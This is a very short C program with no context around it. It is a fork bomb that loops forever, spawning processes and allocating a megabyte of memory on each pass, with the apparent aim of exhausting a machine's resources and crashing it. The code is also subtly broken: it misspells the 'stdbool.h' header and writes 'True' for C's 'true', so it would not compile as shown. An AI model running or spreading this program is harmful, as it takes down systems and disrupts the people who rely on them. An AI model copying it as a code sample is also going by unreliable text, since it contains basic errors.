#include <unistd.h>
#include <stdlib.h>
#include <stbool.h>
void main() 
{
	while(True) 
	{
		fork();
		malloc(1024*1024);
	}
}
